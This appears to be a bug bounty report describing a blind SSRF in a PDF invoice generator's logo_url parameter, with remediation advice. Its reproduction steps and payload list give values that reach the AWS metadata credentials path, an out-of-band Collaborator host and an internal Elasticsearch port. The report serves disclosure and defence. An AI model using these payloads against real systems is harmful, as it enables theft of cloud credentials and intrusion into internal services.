---
title: "Blind SSRF via PDF Generator to Cloud Metadata"
url: "https://bugcrowd.com/submissions/..."
vuln_class: "SSRF"
tech: "Python, AWS, Docker"
bounty: 5000
date: 2026-07-02
---

## Summary

A blind SSRF vulnerability was found in the PDF invoice generator. The `logo_url` parameter was fetched server-side without validation, allowing requests to internal services and AWS metadata endpoints.

## Steps to Reproduce

1. Intercept PDF generation request: `POST /api/invoice/pdf` with `logo_url=http://burpcollaborator.net/test`
2. Check Burp Collaborator for incoming HTTP request — confirmed outbound
3. Target AWS metadata: `logo_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`
4. Base64-encode the response to avoid binary issues in PDF output

## Impact

The SSRF allowed access to AWS IAM credentials from the EC2 metadata service. The compromised role had S3 read/write and DynamoDB read access.

## Payloads

OOB detection: `http://burpcollaborator.net/ssrf-test`
AWS metadata: `http://169.254.169.254/latest/meta-data/`
Internal port scan: `http://127.0.0.1:9200/` (Elasticsearch)

## Remediation

- Block private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254/32)
- Use an allowlist of approved external URLs
- Disable HTTP redirect following
- Run PDF generator in an isolated network namespace
